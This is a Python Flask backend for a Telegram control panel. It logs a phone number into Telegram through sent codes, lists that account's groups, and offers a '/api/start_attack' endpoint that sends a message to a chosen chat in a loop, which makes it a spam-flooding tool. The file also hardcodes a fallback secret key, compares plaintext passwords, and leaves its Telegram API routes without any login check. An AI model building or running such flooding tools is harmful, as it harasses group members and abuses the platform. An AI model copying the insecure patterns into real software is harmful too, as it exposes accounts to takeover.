import os
import json
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from core.auth import is_logged_in, login_user, logout_user, get_current_user
from core.data import load_users
from core.telegram_client import (
    api_send_code,
    api_confirm_code,
    api_get_dialogs,
    api_send_message_loop
)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "devkey123")


# ========================== ROTAS DE AUTENTICAÇÃO ==============================

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        users = load_users()
        username = request.form.get("username")
        password = request.form.get("password")

        # Agora o username é o próprio UID (admin, cliente01, etc)
        if username in users and users[username]["password"] == password:
            login_user(username)
            return redirect(url_for("dashboard"))

        return render_template("login.html", error="Usuário ou senha incorretos.")

    return render_template("login.html")


@app.route("/logout")
def logout():
    logout_user()
    return redirect(url_for("login"))


# ========================== DASHBOARD ==============================

@app.route("/")
def dashboard():
    if not is_logged_in():
        return redirect(url_for("login"))

    user = get_current_user()

    return render_template("dashboard.html", user=user)


# ========================== API TELEGRAM =======================================

@app.route("/api/send_code", methods=["POST"])
def send_code():
    data = request.get_json()
    phone = data.get("phone")

    res = api_send_code(phone)
    return jsonify(res)


@app.route("/api/confirm_code", methods=["POST"])
def confirm_code():
    data = request.get_json()
    phone = data.get("phone")
    code = data.get("code")
    phone_hash = data.get("phone_hash")

    res = api_confirm_code(phone, code, phone_hash)
    return jsonify(res)


@app.route("/api/list_groups", methods=["POST"])
def list_groups():
    data = request.get_json()
    phone = data.get("phone")

    res = api_get_dialogs(phone)
    return jsonify(res)


@app.route("/api/start_attack", methods=["POST"])
def start_attack():
    data = request.get_json()
    phone = data.get("phone")
    chat_id = data.get("chat_id")
    message = data.get("message")

    res = api_send_message_loop(phone, chat_id, message)
    return jsonify(res)


# ========================== RUN ==============================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
